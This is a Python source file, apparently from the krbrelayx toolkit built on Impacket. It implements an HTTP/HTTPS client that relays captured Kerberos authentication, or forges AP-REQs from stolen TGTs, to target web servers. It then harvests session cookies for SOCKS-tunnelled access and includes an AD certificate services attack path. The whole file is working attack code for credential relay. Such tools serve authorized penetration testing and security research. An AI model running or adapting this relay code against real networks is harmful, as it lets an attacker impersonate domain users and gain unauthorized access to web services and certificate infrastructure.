# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2020 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   HTTP Protocol Client
#   HTTP(s) client for relaying NTLMSSP authentication to webservers
#
# Author:
#   Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
#   Alberto Solino (@agsolino)
#
import re
import ssl
try:
    from http.client import HTTPConnection, HTTPSConnection, ResponseNotReady
except ImportError:
    from httplib import HTTPConnection, HTTPSConnection, ResponseNotReady
import base64

from struct import unpack
from impacket import LOG
from lib.clients import ProtocolClient
from lib.utils.kerberos import build_apreq
from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED
from impacket.ntlm import NTLMAuthChallenge
from impacket.spnego import SPNEGO_NegTokenResp

PROTOCOL_CLIENT_CLASSES = ["HTTPRelayClient","HTTPSRelayClient"]

_client_idx = 0


def _next_client_id():
    global _client_idx
    _client_idx += 1
    return _client_idx


class HTTPRelayClient(ProtocolClient):
    PLUGIN_NAME = "HTTP"

    def __init__(self, serverConfig, target, targetPort = 80, extendedSecurity=True ):
        ProtocolClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)
        self.extendedSecurity = extendedSecurity
        self.negotiateMessage = None
        self.authenticateMessageBlob = None
        self.server = None
        self.authenticationMethod = None
        self.client_id = _next_client_id()
        self.negotiate_header = None
        self.session_cookies = []

    def initConnection(self, authdata, kdc=None):
        self.session = HTTPConnection(self.targetHost,self.targetPort)
        self.lastresult = None
        if self.target.path == '':
            self.path = '/'
        else:
            self.path = self.target.path
        if getattr(self.serverConfig, 'runSocks', False):
            return self._socksDeferredAuth(authdata, kdc)
        return self.doInitialActions(authdata, kdc)

    def _build_negotiate_header(self, authdata, kdc):
        if self.serverConfig.mode == 'RELAY':
            negotiate = base64.b64encode(authdata['krbauth']).decode("ascii")
        else:
            krbauth = build_apreq(authdata['domain'], kdc, authdata['tgt'],
                                  authdata['username'], 'http', self.targetHost)
            negotiate = base64.b64encode(krbauth).decode("ascii")
        self.authenticationMethod = 'Negotiate'
        return 'Negotiate ' + negotiate

    def _socksDeferredAuth(self, authdata, kdc):
        self.negotiate_header = self._build_negotiate_header(authdata, kdc)
        try:
            self.session.connect()
        except Exception as e:
            LOG.error('HTTPD: TCP connect to %s:%s failed: %s'
                      % (self.targetHost, self.targetPort, e))
            return False

        login_path = getattr(self.serverConfig, 'socksLoginPath', '')
        if login_path:
            self._tradeApreqForCookie(login_path)
        else:
            LOG.info('HTTPD: SOCKS-mode TCP relay opened to %s:%s; '
                     'no login path configured, AP-REQ will be replayed '
                     '(may fail on Windows SSPI replay cache)'
                     % (self.targetHost, self.targetPort))
        return None, STATUS_SUCCESS

    def _tradeApreqForCookie(self, login_path):
        sock = self.session.sock
        host_header = '%s:%d' % (self.targetHost, self.targetPort) \
            if self.targetPort not in (80, 443) else self.targetHost
        req = (
            'GET %s HTTP/1.1\r\n'
            'Host: %s\r\n'
            'Authorization: %s\r\n'
            'User-Agent: krbrelayx-socks\r\n'
            'Accept: */*\r\n'
            'Connection: keep-alive\r\n\r\n'
        ) % (login_path, host_header, self.negotiate_header)
        try:
            sock.sendall(req.encode('latin-1'))
        except OSError as e:
            LOG.error('HTTPD: SOCKS pre-auth send to %s failed: %s'
                      % (login_path, e))
            return

        buf = b''
        sock.settimeout(10.0)
        try:
            while b'\r\n\r\n' not in buf:
                chunk = sock.recv(8192)
                if not chunk:
                    break
                buf += chunk
        except OSError as e:
            LOG.error('HTTPD: SOCKS pre-auth read from %s failed: %s'
                      % (login_path, e))
            return
        finally:
            try:
                sock.settimeout(None)
            except OSError:
                pass

        head_end = buf.find(b'\r\n\r\n')
        if head_end == -1:
            LOG.warning('HTTPD: SOCKS pre-auth got no full response from %s'
                        % login_path)
            return
        head = buf[:head_end].decode('latin-1', 'replace')
        body_so_far = buf[head_end + 4:]
        body_size = 0
        is_chunked = False
        status = None
        for i, line in enumerate(head.split('\r\n')):
            if i == 0:
                parts = line.split(' ', 2)
                if len(parts) >= 2:
                    try:
                        status = int(parts[1])
                    except ValueError:
                        status = None
                continue
            lower = line.lower()
            if lower.startswith('content-length:'):
                try:
                    body_size = int(line.split(':', 1)[1].strip())
                except ValueError:
                    body_size = 0
            elif lower.startswith('transfer-encoding:') and 'chunked' in lower:
                is_chunked = True
            elif lower.startswith('set-cookie:'):
                cookie_pair = line.split(':', 1)[1].strip().split(';', 1)[0].strip()
                if not cookie_pair or '=' not in cookie_pair:
                    continue
                name, _, value = cookie_pair.partition('=')
                name = name.strip()
                value = value.strip()
                if not value:
                    continue
                self.session_cookies = [
                    c for c in self.session_cookies
                    if c.split('=', 1)[0].strip() != name
                ]
                self.session_cookies.append('%s=%s' % (name, value))

        try:
            if is_chunked:
                self._drainChunked(sock, body_so_far)
            elif body_size:
                remaining = body_size - len(body_so_far)
                while remaining > 0:
                    extra = sock.recv(min(8192, remaining))
                    if not extra:
                        break
                    remaining -= len(extra)
        except OSError:
            pass

        if self.session_cookies:
            cookie_names = ', '.join(c.split('=', 1)[0] for c in self.session_cookies)
            LOG.info('HTTPD: SOCKS pre-auth %s [%s]: captured %d session cookie(s) [%s] '
                     '(AP-REQ will not be replayed on tunneled requests)'
                     % (login_path, status, len(self.session_cookies), cookie_names))
        else:
            LOG.warning('HTTPD: SOCKS pre-auth %s [%s]: no session cookie returned. '
                        'Falling back to AP-REQ replay; expect SEC_E_LOGON_DENIED '
                        'on Windows SSPI targets.' % (login_path, status))

    @staticmethod
    def _drainChunked(sock, body_so_far):
        buf = body_so_far
        while True:
            while b'\r\n' not in buf:
                chunk = sock.recv(8192)
                if not chunk:
                    return
                buf += chunk
            size_line, _, rest = buf.partition(b'\r\n')
            try:
                chunk_size = int(size_line.split(b';', 1)[0].strip(), 16)
            except ValueError:
                return
            buf = rest
            need = chunk_size + 2
            while len(buf) < need:
                chunk = sock.recv(8192)
                if not chunk:
                    return
                buf += chunk
            buf = buf[need:]
            if chunk_size == 0:
                return

    def doInitialActions(self, authdata, kdc=None):
        self.session.request('GET', self.path)
        res = self.session.getresponse()
        res.read()

        auth_required_codes = (401, 500)
        if res.status not in auth_required_codes:
            LOG.info('Status code returned: %d. Authentication does not seem required for URL' % res.status)
        www_auth = res.getheader('WWW-Authenticate') or ''
        if 'Kerberos' in www_auth:
            self.authenticationMethod = 'Kerberos'
        elif 'Negotiate' in www_auth:
            self.authenticationMethod = 'Negotiate'
        elif self.serverConfig.isADCSAttack:
            LOG.info('IIS cert server may allow anonymous auth, sending Negotiate anyway')
            self.authenticationMethod = 'Negotiate'
        elif res.status in auth_required_codes:
            LOG.warning('No WWW-Authenticate header on URL %s (status %d); forcing Negotiate'
                        % (self.targetHost, res.status))
            self.authenticationMethod = 'Negotiate'
        else:
            LOG.error('No authentication requested by the server for url %s' % self.targetHost)
            return False

        # Negotiate auth
        if self.serverConfig.mode == 'RELAY':
            # Relay mode is pass-through
            negotiate = base64.b64encode(authdata['krbauth']).decode("ascii")
        else:
            # Unconstrained delegation mode has to build TGT manually
            krbauth = build_apreq(authdata['domain'], kdc, authdata['tgt'], authdata['username'], 'http', self.targetHost)
            negotiate = base64.b64encode(krbauth).decode("ascii")

        self.negotiate_header = '%s %s' % (self.authenticationMethod, negotiate)

        headers = {'Authorization': self.negotiate_header}
        self.session.request('GET', self.path ,headers=headers)
        res = self.session.getresponse()
        if res.status == 401:
            res.read()
            return None, STATUS_ACCESS_DENIED
        else:
            LOG.info('HTTP server returned status code %d, treating as a successful login' % res.status)
            #Cache this
            try:
                for name, value in res.getheaders():
                    if name.lower() == 'set-cookie':
                        cookie_pair = value.split(';', 1)[0].strip()
                        if cookie_pair:
                            self.session_cookies.append(cookie_pair)
            except Exception as e:
                LOG.debug('HTTPD: cookie capture failed: %s' % e)
            if self.session_cookies:
                LOG.info('HTTPD: captured %d session cookie(s) from %s; '
                         'SOCKS will use them instead of replaying the AP-REQ'
                         % (len(self.session_cookies), self.targetHost))
            self.lastresult = res.read()
            return None, STATUS_SUCCESS

    def killConnection(self):
        if self.session is not None:
            self.session.close()
            self.session = None

    def keepAlive(self):
        # Do a HEAD for favicon.ico
        if getattr(self.serverConfig, 'runSocks', False):
            return
        self.session.request('HEAD','/favicon.ico')
        self.session.getresponse().read()

    def isAdmin(self):
        return 'N/A'

class HTTPSRelayClient(HTTPRelayClient):
    PLUGIN_NAME = "HTTPS"

    def __init__(self, serverConfig, target, targetPort = 443, extendedSecurity=True ):
        HTTPRelayClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)

    def initConnection(self, authdata, kdc=None):
        self.lastresult = None
        if self.target.path == '':
            self.path = '/'
        else:
            self.path = self.target.path
        try:
            uv_context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
            self.session = HTTPSConnection(self.targetHost,self.targetPort, context=uv_context)
        except AttributeError:
            self.session = HTTPSConnection(self.targetHost,self.targetPort)
        if getattr(self.serverConfig, 'runSocks', False):
            return self._socksDeferredAuth(authdata, kdc)
        return self.doInitialActions(authdata, kdc)

